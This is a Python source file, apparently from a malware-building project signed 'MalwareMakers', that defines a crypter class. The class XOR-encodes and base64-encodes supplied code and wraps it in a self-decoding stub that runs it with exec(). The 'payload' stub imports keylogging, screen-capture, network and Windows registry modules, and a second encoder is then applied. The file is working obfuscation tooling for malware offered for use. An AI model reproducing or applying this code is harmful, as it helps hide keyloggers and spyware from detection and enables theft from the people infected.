# Made by MalwareMakers 
# Github : https://github.com/MalwareMakers

import base64
from src.file_encoder2 import *

class File_encoder: 
    def __init__(self,code,type1): 
        self.type1 = type1
        self.code = code
        self.key = key
    
    def File_encoder(self): 
        def xor_encode(input_str, key):
            encoded = []
            for i in range(len(input_str)):
                encoded.append(chr(ord(input_str[i]) ^ ord(key[i % len(key)])))
            return ''.join(encoded)
        
        encoded_code = xor_encode(self.code, self.key)
        base64_encoded_code = base64.b64encode(encoded_code.encode()).decode()

        if self.type1.lower() == "payload": 
            script = rf'''
import os
import requests
import time
import threading
import datetime
from PIL import ImageGrab
import queue
from pynput import keyboard
import concurrent.futures
import sys
import psutil
import json
import winreg as reg
import base64



script = b'{base64_encoded_code}'
key = '{self.key}'

def xor_decode(encoded_str, key):
    decoded = []
    for i in range(len(encoded_str)):
        decoded.append(chr(ord(encoded_str[i]) ^ ord(key[i % len(key)])))
    return ''.join(decoded)

encoded_code = base64.b64decode(script.decode()).decode()
decoded_code = xor_decode(encoded_code, key)
exec(decoded_code)
'''
            encoding = Encoder2(code=script, code_type=self.type1)
            src1 = encoding.Encoding()

            return src1
    
        elif self.type1.lower() == "installer":
            script1 = rf'''
import requests
import subprocess
import os
from urllib.parse import urlparse
from ctypes import *
import platform 
import psutil
import win32pdh
import base64

script = b'{base64_encoded_code}'
key = '{self.key}'

def xor_decode(encoded_str, key):
    decoded = []
    for i in range(len(encoded_str)):
        decoded.append(chr(ord(encoded_str[i]) ^ ord(key[i % len(key)])))
    return ''.join(decoded)

encoded_code = base64.b64decode(script.decode()).decode()
decoded_code = xor_decode(encoded_code, key)
exec(decoded_code)
'''
            encoding = Encoder2(code=script1, code_type=self.type1)
            src2 = encoding.Encoding()

            return src2



key = "mysecretkey"